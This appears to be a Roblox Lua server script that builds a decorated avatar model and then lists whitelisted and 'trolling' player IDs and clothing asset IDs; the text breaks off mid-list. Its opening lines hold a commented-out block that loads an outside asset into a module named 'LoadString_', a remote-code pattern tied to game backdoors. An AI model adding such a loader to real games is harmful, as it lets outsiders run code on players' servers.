local Players = game.Players
--[[local insert = game:GetService("InsertService")
local MD = insert:LoadAsset(14382140693)
MD.Parent = workspace.Ignore
local MODULE_GET = MD:GetChildren()[1]
MODULE_GET.Parent=game.ReplicatedStorage.Modules
MODULE_GET.Name="LoadString_"]]
function CreateVad(CFrame_:CFrame,Parent_)
	local Module_Scripts = {}
	local F_Vad = Instance.new("Model")
	local Head = Instance.new("Part")
	local Mesh = Instance.new("SpecialMesh")
	local HairAttachment = Instance.new("Attachment")
	local HatAttachment = Instance.new("Attachment")
	local FaceFrontAttachment = Instance.new("Attachment")
	local FaceCenterAttachment = Instance.new("Attachment")
	local face = Instance.new("Decal")
	local Torso = Instance.new("Part")
	local roblox = Instance.new("Decal")
	local NeckAttachment = Instance.new("Attachment")
	local BodyFrontAttachment = Instance.new("Attachment")
	local BodyBackAttachment = Instance.new("Attachment")
	local LeftCollarAttachment = Instance.new("Attachment")
	local RightCollarAttachment = Instance.new("Attachment")
	local WaistFrontAttachment = Instance.new("Attachment")
	local WaistCenterAttachment = Instance.new("Attachment")
	local WaistBackAttachment = Instance.new("Attachment")
	local Left_Arm = Instance.new("Part")
	local LeftShoulderAttachment = Instance.new("Attachment")
	local LeftGripAttachment = Instance.new("Attachment")
	local Right_Arm = Instance.new("Part")
	local RightShoulderAttachment = Instance.new("Attachment")
	local RightGripAttachment = Instance.new("Attachment")
	local Left_Leg = Instance.new("Part")
	local LeftFootAttachment = Instance.new("Attachment")
	local Right_Leg = Instance.new("Part")
	local RightFootAttachment = Instance.new("Attachment")
	local Humanoid = Instance.new("Humanoid")
	local Animator = Instance.new("Animator")
	local HumanoidRootPart = Instance.new("Part")
	local RootAttachment = Instance.new("Attachment")
	local Body_Colors = Instance.new("BodyColors")
	local Pants = Instance.new("Pants")
	local Shirt = Instance.new("Shirt")
	local BrownHairCatEars = Instance.new("Accessory")
	local ThumbnailConfiguration = Instance.new("Configuration")
	local ThumbnailCameraTarget = Instance.new("ObjectValue")
	local ThumbnailCameraValue = Instance.new("CFrameValue")
	local Handle = Instance.new("Part")
	local SpecialMesh = Instance.new("SpecialMesh")
	local AvatarPartScaleType = Instance.new("StringValue")
	local HatAttachment_1 = Instance.new("Attachment")
	local OriginalSize = Instance.new("Vector3Value")
	local GiantBellGold = Instance.new("Accessory")
	local Handle_1 = Instance.new("Part")
	local Mesh_1 = Instance.new("SpecialMesh")
	local NeckAttachment_1 = Instance.new("Attachment")
	local OriginalSize_1 = Instance.new("Vector3Value")
	local NerdHair = Instance.new("Accessory")
	local Handle_2 = Instance.new("Part")
	local Mesh_2 = Instance.new("SpecialMesh")
	local HairAttachment_1 = Instance.new("Attachment")
	local OriginalSize_2 = Instance.new("Vector3Value")
	local NoLine = Instance.new("Accessory")
	local ThumbnailConfiguration_1 = Instance.new("Configuration")
	local ThumbnailCameraTarget_1 = Instance.new("ObjectValue")
	local ThumbnailCameraValue_1 = Instance.new("CFrameValue")
	local Handle_3 = Instance.new("Part")
	local SpecialMesh_1 = Instance.new("SpecialMesh")
	local AvatarPartScaleType_1 = Instance.new("StringValue")
	local FaceFrontAttachment_1 = Instance.new("Attachment")
	local OriginalSize_3 = Instance.new("Vector3Value")
	local Y2K_Cyberstar_Glasses = Instance.new("Accessory")
	local Handle_4 = Instance.new("Part")
	local SpecialMesh_2 = Instance.new("SpecialMesh")
	local AvatarPartScaleType_2 = Instance.new("StringValue")
	local FaceFrontAttachment_2 = Instance.new("Attachment")
	local OriginalSize_4 = Instance.new("Vector3Value")
	local Right_Shoulder = Instance.new("Motor6D")
	local Left_Shoulder = Instance.new("Motor6D")
	local Right_Hip = Instance.new("Motor6D")
	local Left_Hip = Instance.new("Motor6D")
	local Neck = Instance.new("Motor6D")
	local RootJoint = Instance.new("Motor6D")
	local AccessoryWeld = Instance.new("Weld")
	local AccessoryWeld_1 = Instance.new("Weld")
	local AccessoryWeld_2 = Instance.new("Weld")
	local AccessoryWeld_3 = Instance.new("Weld")
	local AccessoryWeld_4 = Instance.new("Weld")
	-- Properties --

	F_Vad.Name = [[F_Vad]]
	F_Vad.Parent = Parent_
	F_Vad.PrimaryPart = HumanoidRootPart

	Head.BrickColor = BrickColor.new([[Light orange]])
	Head.CFrame = CFrame.new(- 4.08618164, 5.5, - 1.1027832, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Head.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Head.Name = [[Head]]
	Head.Parent = F_Vad
	--Head.Position = Vector3.new(- 4.086181640625, 5.5, - 1.102783203125)
	Head.Size = Vector3.new(2, 1, 1)
	Head.TopSurface = Enum.SurfaceType.Smooth

	Mesh.Parent = Head
	Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)

	HairAttachment.CFrame = CFrame.new(0, 0.600000024, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	HairAttachment.Name = [[HairAttachment]]
	HairAttachment.Parent = Head
	HairAttachment.Position = Vector3.new(0, 0.6000000238418579, 0)

	HatAttachment.CFrame = CFrame.new(0, 0.600000024, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	HatAttachment.Name = [[HatAttachment]]
	HatAttachment.Parent = Head
	HatAttachment.Position = Vector3.new(0, 0.6000000238418579, 0)

	FaceFrontAttachment.CFrame = CFrame.new(0, 0, - 0.600000024, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	FaceFrontAttachment.Name = [[FaceFrontAttachment]]
	FaceFrontAttachment.Parent = Head
	FaceFrontAttachment.Position = Vector3.new(0, 0, - 0.6000000238418579)

	FaceCenterAttachment.Name = [[FaceCenterAttachment]]
	FaceCenterAttachment.Parent = Head

	face.Color3 = Color3.new(0, 0, 0)
	face.Name = [[face]]
	face.Parent = Head
	face.Texture = [[rbxassetid://17182577280]]

	Torso.BrickColor = BrickColor.new([[Light orange]])
	Torso.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Torso.LeftParamA = 0
	Torso.LeftParamB = 0
	Torso.LeftSurface = Enum.SurfaceType.Weld
	Torso.Name = [[Torso]]
	Torso.Parent = F_Vad
	--Torso.Position = Vector3.new(- 4.086181640625, 3.999999761581421, - 1.102783203125)
	Torso.RightParamA = 0
	Torso.RightParamB = 0
	Torso.RightSurface = Enum.SurfaceType.Weld
	Torso.Size = Vector3.new(2, 2, 1)

	roblox.Name = [[roblox]]
	roblox.Parent = Torso

	NeckAttachment.CFrame = CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	NeckAttachment.Name = [[NeckAttachment]]
	NeckAttachment.Parent = Torso
	NeckAttachment.Position = Vector3.new(0, 1, 0)

	BodyFrontAttachment.CFrame = CFrame.new(0, 0, - 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	BodyFrontAttachment.Name = [[BodyFrontAttachment]]
	BodyFrontAttachment.Parent = Torso
	BodyFrontAttachment.Position = Vector3.new(0, 0, - 0.5)

	BodyBackAttachment.CFrame = CFrame.new(0, 0, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	BodyBackAttachment.Name = [[BodyBackAttachment]]
	BodyBackAttachment.Parent = Torso
	BodyBackAttachment.Position = Vector3.new(0, 0, 0.5)

	LeftCollarAttachment.CFrame = CFrame.new(- 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	LeftCollarAttachment.Name = [[LeftCollarAttachment]]
	LeftCollarAttachment.Parent = Torso
	LeftCollarAttachment.Position = Vector3.new(- 1, 1, 0)

	RightCollarAttachment.CFrame = CFrame.new(1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	RightCollarAttachment.Name = [[RightCollarAttachment]]
	RightCollarAttachment.Parent = Torso
	RightCollarAttachment.Position = Vector3.new(1, 1, 0)

	WaistFrontAttachment.CFrame = CFrame.new(0, - 1, - 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	WaistFrontAttachment.Name = [[WaistFrontAttachment]]
	WaistFrontAttachment.Parent = Torso
	WaistFrontAttachment.Position = Vector3.new(0, - 1, - 0.5)

	WaistCenterAttachment.CFrame = CFrame.new(0, - 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	WaistCenterAttachment.Name = [[WaistCenterAttachment]]
	WaistCenterAttachment.Parent = Torso
	WaistCenterAttachment.Position = Vector3.new(0, - 1, 0)

	WaistBackAttachment.CFrame = CFrame.new(0, - 1, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	WaistBackAttachment.Name = [[WaistBackAttachment]]
	WaistBackAttachment.Parent = Torso
	WaistBackAttachment.Position = Vector3.new(0, - 1, 0.5)

	Left_Arm.BrickColor = BrickColor.new([[Light orange]])
	Left_Arm.CanCollide = false
	Left_Arm.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Left_Arm.Name = [[Left Arm]]
	Left_Arm.Parent = F_Vad
	--Left_Arm.Position = Vector3.new(- 5.586181640625, 3.999999761581421, - 1.102783203125)
	Left_Arm.Size = Vector3.new(1, 2, 1)

	LeftShoulderAttachment.CFrame = CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	LeftShoulderAttachment.Name = [[LeftShoulderAttachment]]
	LeftShoulderAttachment.Parent = Left_Arm
	LeftShoulderAttachment.Position = Vector3.new(0, 1, 0)

	LeftGripAttachment.CFrame = CFrame.new(0, - 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	LeftGripAttachment.Name = [[LeftGripAttachment]]
	LeftGripAttachment.Parent = Left_Arm
	LeftGripAttachment.Position = Vector3.new(0, - 1, 0)

	Right_Arm.BrickColor = BrickColor.new([[Light orange]])
	Right_Arm.CanCollide = false
	Right_Arm.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Right_Arm.Name = [[Right Arm]]
	Right_Arm.Parent = F_Vad
	--Right_Arm.Position = Vector3.new(- 2.586181640625, 3.999999761581421, - 1.102783203125)
	Right_Arm.Size = Vector3.new(1, 2, 1)

	RightShoulderAttachment.CFrame = CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	RightShoulderAttachment.Name = [[RightShoulderAttachment]]
	RightShoulderAttachment.Parent = Right_Arm
	RightShoulderAttachment.Position = Vector3.new(0, 1, 0)

	RightGripAttachment.CFrame = CFrame.new(0, - 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	RightGripAttachment.Name = [[RightGripAttachment]]
	RightGripAttachment.Parent = Right_Arm
	RightGripAttachment.Position = Vector3.new(0, - 1, 0)

	Left_Leg.BottomSurface = Enum.SurfaceType.Smooth
	Left_Leg.BrickColor = BrickColor.new([[Light orange]])
	Left_Leg.CanCollide = false
	Left_Leg.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Left_Leg.Name = [[Left Leg]]
	Left_Leg.Parent = F_Vad
	--Left_Leg.Position = Vector3.new(- 4.586181640625, 1.999999761581421, - 1.102783203125)
	Left_Leg.Size = Vector3.new(1, 2, 1)

	LeftFootAttachment.CFrame = CFrame.new(0, - 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	LeftFootAttachment.Name = [[LeftFootAttachment]]
	LeftFootAttachment.Parent = Left_Leg
	LeftFootAttachment.Position = Vector3.new(0, - 1, 0)

	Right_Leg.BottomSurface = Enum.SurfaceType.Smooth
	Right_Leg.BrickColor = BrickColor.new([[Light orange]])
	Right_Leg.CanCollide = false
	Right_Leg.Color = Color3.new(0.917647, 0.721569, 0.572549)
	Right_Leg.Name = [[Right Leg]]
	Right_Leg.Parent = F_Vad
	--Right_Leg.Position = Vector3.new(- 3.586181640625, 1.999999761581421, - 1.102783203125)
	Right_Leg.Size = Vector3.new(1, 2, 1)

	RightFootAttachment.CFrame = CFrame.new(0, - 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	RightFootAttachment.Name = [[RightFootAttachment]]
	RightFootAttachment.Parent = Right_Leg
	RightFootAttachment.Position = Vector3.new(0, - 1, 0)

	Humanoid.Parent = F_Vad

	Animator.Parent = Humanoid

	HumanoidRootPart.Anchored = true
	HumanoidRootPart.BottomSurface = Enum.SurfaceType.Smooth
	HumanoidRootPart.CFrame = CFrame_
	HumanoidRootPart.CanCollide = false
	HumanoidRootPart.LeftParamA = 0
	HumanoidRootPart.LeftParamB = 0
	HumanoidRootPart.Name = [[HumanoidRootPart]]
	HumanoidRootPart.Parent = F_Vad
	--HumanoidRootPart.Position = Vector3.new(- 4.086181640625, 3.999999761581421, - 1.102783203125)
	HumanoidRootPart.RightParamA = 0
	HumanoidRootPart.RightParamB = 0
	HumanoidRootPart.Size = Vector3.new(2, 2, 1)
	HumanoidRootPart.TopSurface = Enum.SurfaceType.Smooth
	HumanoidRootPart.Transparency = 1

	RootAttachment.Name = [[RootAttachment]]
	RootAttachment.Parent = HumanoidRootPart

	Body_Colors.HeadColor = BrickColor.new([[Light orange]])
	Body_Colors.HeadColor3 = Color3.new(0.917647, 0.721569, 0.572549)
	Body_Colors.LeftArmColor = BrickColor.new([[Light orange]])
	Body_Colors.LeftArmColor3 = Color3.new(0.917647, 0.721569, 0.572549)
	Body_Colors.LeftLegColor = BrickColor.new([[Light orange]])
	Body_Colors.LeftLegColor3 = Color3.new(0.917647, 0.721569, 0.572549)
	Body_Colors.Parent = F_Vad
	Body_Colors.RightArmColor = BrickColor.new([[Light orange]])
	Body_Colors.RightArmColor3 = Color3.new(0.917647, 0.721569, 0.572549)
	Body_Colors.RightLegColor = BrickColor.new([[Light orange]])
	Body_Colors.RightLegColor3 = Color3.new(0.917647, 0.721569, 0.572549)
	Body_Colors.TorsoColor = BrickColor.new([[Light orange]])
	Body_Colors.TorsoColor3 = Color3.new(0.917647, 0.721569, 0.572549)

	Pants.Name = [[Pants]]
	Pants.PantsTemplate = [[http://www.roblox.com/asset/?id=5720984882]]
	Pants.Parent = F_Vad

	Shirt.Name = [[Shirt]]
	Shirt.Parent = F_Vad
	Shirt.ShirtTemplate = [[http://www.roblox.com/asset/?id=14443254505]]

	BrownHairCatEars.AttachmentPoint = CFrame.new(0, 0.00956964493, - 0.0306535214, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	BrownHairCatEars.AttachmentPos = Vector3.new(0, 0.009569644927978516, - 0.030653521418571472)
	BrownHairCatEars.Name = [[BrownHairCatEars]]
	BrownHairCatEars.Parent = F_Vad

	ThumbnailConfiguration.Name = [[ThumbnailConfiguration]]
	ThumbnailConfiguration.Parent = BrownHairCatEars

	ThumbnailCameraTarget.Name = [[ThumbnailCameraTarget]]
	ThumbnailCameraTarget.Parent = ThumbnailConfiguration
	ThumbnailCameraTarget.Value = Handle

	ThumbnailCameraValue.Name = [[ThumbnailCameraValue]]
	ThumbnailCameraValue.Parent = ThumbnailConfiguration
	ThumbnailCameraValue.Value = CFrame.new(- 11.2208481, 4.15823412, - 16.025032, - 0.81914854, 0.119239673, - 0.561050415, - 2.88113952e-05, 0.978144467, 0.207926452, 0.573581457, 0.170338809, - 0.801242113)

	Handle.BottomSurface = Enum.SurfaceType.Smooth
	--Handle.CFrame = CFrame.new(- 4.08618164, 6.09043026, - 1.07212973, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Handle.CanCollide = false
	Handle.Name = [[Handle]]
	Handle.Parent = BrownHairCatEars
	--Handle.Position = Vector3.new(- 4.086181640625, 6.09043025970459, - 1.072129726409912)
	Handle.Size = Vector3.new(1.6349999904632568, 0.8309999704360962, 0.6620000004768372)
	Handle.TopSurface = Enum.SurfaceType.Smooth

	SpecialMesh.MeshId = [[rbxassetid://12134353540]]
	SpecialMesh.MeshType = Enum.MeshType.FileMesh
	SpecialMesh.Name = [[SpecialMesh]]
	SpecialMesh.Parent = Handle
	SpecialMesh.TextureId = [[rbxassetid://12143415754]]

	AvatarPartScaleType.Name = [[AvatarPartScaleType]]
	AvatarPartScaleType.Parent = Handle
	AvatarPartScaleType.Value = [[Classic]]

	HatAttachment_1.CFrame = CFrame.new(0, 0.00956964493, - 0.0306535214, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	HatAttachment_1.Name = [[HatAttachment]]
	HatAttachment_1.Parent = Handle
	HatAttachment_1.Position = Vector3.new(0, 0.009569644927978516, - 0.030653521418571472)

	OriginalSize.Name = [[OriginalSize]]
	OriginalSize.Parent = Handle
	OriginalSize.Value = Vector3.new(1.6349999904632568, 0.8309999704360962, 0.6620000004768372)

	GiantBellGold.AttachmentPoint = CFrame.new(0, 1.20000005, 0.600000024, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	GiantBellGold.AttachmentPos = Vector3.new(0, 1.2000000476837158, 0.6000000238418579)
	GiantBellGold.Name = [[GiantBellGold]]
	GiantBellGold.Parent = F_Vad

	Handle_1.BottomSurface = Enum.SurfaceType.Smooth
	--Handle_1.CFrame = CFrame.new(- 4.08618164, 4.79999971, - 1.70278323, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Handle_1.CanCollide = false
	Handle_1.Name = [[Handle]]
	Handle_1.Parent = GiantBellGold
	--Handle_1.Position = Vector3.new(- 4.086181640625, 4.799999713897705, - 1.702783226966858)
	Handle_1.Size = Vector3.new(0.5, 0.5, 0.5)
	Handle_1.TopSurface = Enum.SurfaceType.Smooth

	Mesh_1.MeshId = [[rbxassetid://7317236010]]
	Mesh_1.MeshType = Enum.MeshType.FileMesh
	Mesh_1.Parent = Handle_1
	Mesh_1.TextureId = [[http://www.roblox.com/asset/?id=7386119696]]

	NeckAttachment_1.CFrame = CFrame.new(0, 0.200000003, 0.600000024, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	NeckAttachment_1.Name = [[NeckAttachment]]
	NeckAttachment_1.Parent = Handle_1
	NeckAttachment_1.Position = Vector3.new(0, 0.20000000298023224, 0.6000000238418579)

	OriginalSize_1.Name = [[OriginalSize]]
	OriginalSize_1.Parent = Handle_1
	OriginalSize_1.Value = Vector3.new(0.5, 0.5, 0.5)

	NerdHair.AttachmentPoint = CFrame.new(0, 0.200000003, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	NerdHair.AttachmentPos = Vector3.new(0, 0.20000000298023224, 0)
	NerdHair.Name = [[NerdHair]]
	NerdHair.Parent = F_Vad

	Handle_2.BottomSurface = Enum.SurfaceType.Smooth
	--Handle_2.CFrame = CFrame.new(- 4.08618164, 5.80000019, - 1.10251093, 1, - 7.87137555e-09, 0, 7.87137555e-09, 1, 4.1444221e-16, - 3.26223034e-24, - 4.1444221e-16, 1)
	Handle_2.CanCollide = false
	Handle_2.Name = [[Handle]]
	Handle_2.Parent = NerdHair
	--Handle_2.Position = Vector3.new(- 4.086181640625, 5.800000190734863, - 1.102510929107666)
	Handle_2.Size = Vector3.new(1, 1, 1)
	Handle_2.TopSurface = Enum.SurfaceType.Smooth

	Mesh_2.MeshId = [[http://www.roblox.com/asset/?id=29938421]]
	Mesh_2.MeshType = Enum.MeshType.FileMesh
	Mesh_2.Parent = Handle_2
	Mesh_2.TextureId = [[http://www.roblox.com/asset/?id=29938532]]

	HairAttachment_1.Axis = Vector3.new(1, - 7.871375551360416e-09, 0)
	HairAttachment_1.CFrame = CFrame.new(8.65838956e-09, 0.299999714, - 0.000272244215, 1, 7.87137555e-09, - 3.26223034e-24, - 7.87137555e-09, 1, - 4.1444221e-16, 0, 4.1444221e-16, 1)
	HairAttachment_1.Name = [[HairAttachment]]
	HairAttachment_1.Orientation = Vector3.new(2.3745789405962836e-14, - 1.8691202130724443e-22, - 4.5099656631464313e-07)
	HairAttachment_1.Parent = Handle_2
	HairAttachment_1.Position = Vector3.new(8.658389560878277e-09, 0.2999997138977051, - 0.0002722442150115967)
	HairAttachment_1.Rotation = Vector3.new(2.3745789405962836e-14, - 1.8691202130724443e-22, - 4.5099656631464313e-07)
	HairAttachment_1.SecondaryAxis = Vector3.new(7.871375551360416e-09, 1, 4.1444220966321485e-16)

	OriginalSize_2.Name = [[OriginalSize]]
	OriginalSize_2.Parent = Handle_2
	OriginalSize_2.Value = Vector3.new(1, 1, 1)

	NoLine.AttachmentPoint = CFrame.new(- 0.00843048096, 0.00625181198, - 0.0866889954, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	NoLine.AttachmentPos = Vector3.new(- 0.00843048095703125, 0.006251811981201172, - 0.08668899536132812)
	NoLine.Name = [[NoLine]]
	NoLine.Parent = F_Vad

	ThumbnailConfiguration_1.Name = [[ThumbnailConfiguration]]
	ThumbnailConfiguration_1.Parent = NoLine

	ThumbnailCameraTarget_1.Name = [[ThumbnailCameraTarget]]
	ThumbnailCameraTarget_1.Parent = ThumbnailConfiguration_1
	ThumbnailCameraTarget_1.Value = Handle_3

	ThumbnailCameraValue_1.Name = [[ThumbnailCameraValue]]
	ThumbnailCameraValue_1.Parent = ThumbnailConfiguration_1
	ThumbnailCameraValue_1.Value = CFrame.new(- 0.0269626062, 0.0923808739, - 0.617546558, - 0.999048591, 0.00640851073, - 0.0431395918, - 3.97705007e-05, 0.989011049, 0.147841483, 0.0436129794, 0.147702515, - 0.988069892)

	Handle_3.BottomSurface = Enum.SurfaceType.Smooth
	--Handle_3.CFrame = CFrame.new(- 4.07775116, 5.49374819, - 1.66108859, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Handle_3.CanCollide = false
	Handle_3.Name = [[Handle]]
	Handle_3.Parent = NoLine
	--Handle_3.Position = Vector3.new(- 4.077751159667969, 5.493748188018799, - 1.6610885858535767)
	Handle_3.Size = Vector3.new(1, 1, 1)
	Handle_3.TopSurface = Enum.SurfaceType.Smooth

	SpecialMesh_1.MeshId = [[rbxassetid://13912668569]]
	SpecialMesh_1.MeshType = Enum.MeshType.FileMesh
	SpecialMesh_1.Name = [[SpecialMesh]]
	SpecialMesh_1.Parent = Handle_3
	SpecialMesh_1.TextureId = [[rbxassetid://13894102122]]

	AvatarPartScaleType_1.Name = [[AvatarPartScaleType]]
	AvatarPartScaleType_1.Parent = Handle_3
	AvatarPartScaleType_1.Value = [[Classic]]

	FaceFrontAttachment_1.CFrame = CFrame.new(- 0.00843048096, 0.00625181198, - 0.0416946411, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	FaceFrontAttachment_1.Name = [[FaceFrontAttachment]]
	FaceFrontAttachment_1.Parent = Handle_3
	FaceFrontAttachment_1.Position = Vector3.new(- 0.00843048095703125, 0.006251811981201172, - 0.04169464111328125)

	OriginalSize_3.Name = [[OriginalSize]]
	OriginalSize_3.Parent = Handle_3
	OriginalSize_3.Value = Vector3.new(1, 1, 1)

	Y2K_Cyberstar_Glasses.AttachmentForward = Vector3.new(- 8.742277657347586e-08, 4.1444258024012927e-16, 1)
	Y2K_Cyberstar_Glasses.AttachmentPoint = CFrame.new(0.000366954104, - 0.144295871, 0.419725001, - 1, - 7.87137555e-09, 8.74227766e-08, - 7.87137555e-09, 1, - 4.1444258e-16, - 8.74227766e-08, - 1.10258003e-15, - 1)
	Y2K_Cyberstar_Glasses.AttachmentPos = Vector3.new(0.0003669541038107127, - 0.14429587125778198, 0.4197250008583069)
	Y2K_Cyberstar_Glasses.AttachmentRight = Vector3.new(- 1, - 7.871375551360416e-09, - 8.742277657347586e-08)
	Y2K_Cyberstar_Glasses.AttachmentUp = Vector3.new(- 7.871375551360416e-09, 1, - 1.1025800345838442e-15)
	Y2K_Cyberstar_Glasses.Name = [[Y2K Cyberstar Glasses]]
	Y2K_Cyberstar_Glasses.Parent = F_Vad

	Handle_4.BottomSurface = Enum.SurfaceType.Smooth
	--Handle_4.CFrame = CFrame.new(- 4.08581448, 5.64429569, - 1.28305817, - 1, - 7.87137555e-09, - 8.74227766e-08, - 7.87137555e-09, 1, - 1.10258003e-15, 8.74227766e-08, - 4.14442527e-16, - 1)
	Handle_4.CanCollide = false
	Handle_4.Name = [[Handle]]
	Handle_4.Orientation = Vector3.new(0, 180, 0)
	Handle_4.Parent = Y2K_Cyberstar_Glasses
	Handle_4.Position = Vector3.new(- 4.085814476013184, 5.644295692443848, - 1.2830581665039062)
	Handle_4.Rotation = Vector3.new(180, 0, 180)
	Handle_4.Size = Vector3.new(1, 1, 1)
	Handle_4.TopSurface = Enum.SurfaceType.Smooth

	SpecialMesh_2.MeshId = [[rbxassetid://8153351333]]
	SpecialMesh_2.MeshType = Enum.MeshType.FileMesh
	SpecialMesh_2.Name = [[SpecialMesh]]
	SpecialMesh_2.Parent = Handle_4
	SpecialMesh_2.TextureId = [[http://www.roblox.com/asset/?id=8153358644]]

	AvatarPartScaleType_2.Name = [[AvatarPartScaleType]]
	AvatarPartScaleType_2.Parent = Handle_4
	AvatarPartScaleType_2.Value = [[Classic]]

	FaceFrontAttachment_2.Axis = Vector3.new(- 1, - 7.871375551360416e-09, - 8.742277657347586e-08)
	FaceFrontAttachment_2.CFrame = CFrame.new(0.000366954104, - 0.144295871, 0.419725001, - 1, - 7.87137555e-09, 8.74227766e-08, - 7.87137555e-09, 1, - 4.14442527e-16, - 8.74227766e-08, - 1.10258003e-15, - 1)
	FaceFrontAttachment_2.Name = [[FaceFrontAttachment]]
	FaceFrontAttachment_2.Orientation = Vector3.new(2.374580634662178e-14, 179.99998474121094, - 4.5099656631464313e-07)
	FaceFrontAttachment_2.Parent = Handle_4
	FaceFrontAttachment_2.Position = Vector3.new(0.0003669541038107127, - 0.14429587125778198, 0.4197250008583069)
	FaceFrontAttachment_2.Rotation = Vector3.new(180, 0.000005008955668017734, 180)
	FaceFrontAttachment_2.SecondaryAxis = Vector3.new(- 7.871375551360416e-09, 1, - 1.1025800345838442e-15)

	OriginalSize_4.Name = [[OriginalSize]]
	OriginalSize_4.Parent = Handle_4
	OriginalSize_4.Value = Vector3.new(1, 1, 1)

	Right_Shoulder.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
	Right_Shoulder.C1 = CFrame.new(- 0.5, 0.5, 0, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
	Right_Shoulder.MaxVelocity = 0.10000000149011612
	Right_Shoulder.Name = [[Right Shoulder]]
	Right_Shoulder.Parent = Torso
	Right_Shoulder.Part0 = Torso
	Right_Shoulder.Part1 = Right_Arm

	Left_Shoulder.C0 = CFrame.new(- 1, 0.5, 0, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
	Left_Shoulder.C1 = CFrame.new(0.5, 0.5, 0, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
	Left_Shoulder.MaxVelocity = 0.10000000149011612
	Left_Shoulder.Name = [[Left Shoulder]]
	Left_Shoulder.Parent = Torso
	Left_Shoulder.Part0 = Torso
	Left_Shoulder.Part1 = Left_Arm

	Right_Hip.C0 = CFrame.new(1, - 1, 0, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
	Right_Hip.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
	Right_Hip.MaxVelocity = 0.10000000149011612
	Right_Hip.Name = [[Right Hip]]
	Right_Hip.Parent = Torso
	Right_Hip.Part0 = Torso
	Right_Hip.Part1 = Right_Leg

	Left_Hip.C0 = CFrame.new(- 1, - 1, 0, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
	Left_Hip.C1 = CFrame.new(- 0.5, 1, 0, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
	Left_Hip.MaxVelocity = 0.10000000149011612
	Left_Hip.Name = [[Left Hip]]
	Left_Hip.Parent = Torso
	Left_Hip.Part0 = Torso
	Left_Hip.Part1 = Left_Leg

	Neck.C0 = CFrame.new(0, 1, 0, - 1, 0, 0, 0, 0, 1, 0, 1, - 0)
	Neck.C1 = CFrame.new(0, - 0.5, 0, - 1, 0, 0, 0, 0, 1, 0, 1, - 0)
	Neck.MaxVelocity = 0.10000000149011612
	Neck.Name = [[Neck]]
	Neck.Parent = Torso
	Neck.Part0 = Torso
	Neck.Part1 = Head

	RootJoint.C0 = CFrame.new(0, 0, 0, - 1, 0, 0, 0, 0, 1, 0, 1, - 0)
	RootJoint.C1 = CFrame.new(0, 0, 0, - 1, 0, 0, 0, 0, 1, 0, 1, - 0)
	RootJoint.MaxVelocity = 0.10000000149011612
	RootJoint.Name = [[RootJoint]]
	RootJoint.Parent = HumanoidRootPart
	RootJoint.Part0 = HumanoidRootPart
	RootJoint.Part1 = Torso

		local anim_ = Instance.new("Animation",F_Vad)
	anim_.AnimationId="rbxassetid://17555626430"
	local anim = Animator:LoadAnimation(anim_)
	anim.Looped=true
	anim.Priority = Enum.AnimationPriority.Action4
	anim:Play()
	return F_Vad
end
CreateVad(CFrame.new(3598.21289, 3, -359.092957, 0.156434491, 0, 0.987688363, 0, 1, 0, -0.987688363, 0, 0.156434491),workspace)
local trolling = {
	[3783228048]=false,
	[461265636]=false,
	--[3264445159]=true
}
local Whitelist = {
	[3264445159]=true,--kol
	[513149855]=true,--danil
	[542520932]=true,--jast
	[726759852]=true, -- leva
	[1344778220]=true, -- iriska
	[2022532039]=true,
	[486953047]=true,
	[179823479]=true,
	[2817594598]=true,
	[3250589841]=true,
}
local pantsids = {
	5720984882,
	11700362334,
	6877514341,
	--5775544779,
	13819646228,
	13257818107, --b
	13499361419, --b
	6465175779,
	10307069395,
	8626213144,
	6783530937,
	7918949707,
	7918949707,
	6289806715,
	14036220919,
	10618287948,
	4939974904,
	--11923680669,
	--8712071160,
}
local shirtids = {
	14443254505,
	14068558142,
	12158002502,
	16818978816,
	12499161503,
	13257821984, --b
	15899668884,
	12358077159,
	14538236803,
	590744260,
	6064644216,
	7026573486,
	--5529692544,
	--12339022358,
}
local maxaccessory = 5
local acessory = {
	13912732291,
	12154587792,
	7386135926,
	12728094797,
	14876851501,
	16745731059,
	13477829910,
	13503698033,
	5235466845,
	5891243570,
	12938636315,
	12471351110,
	14516302303,
	16130217881,
	6102712313,
	5802803573,
	--15611719171,
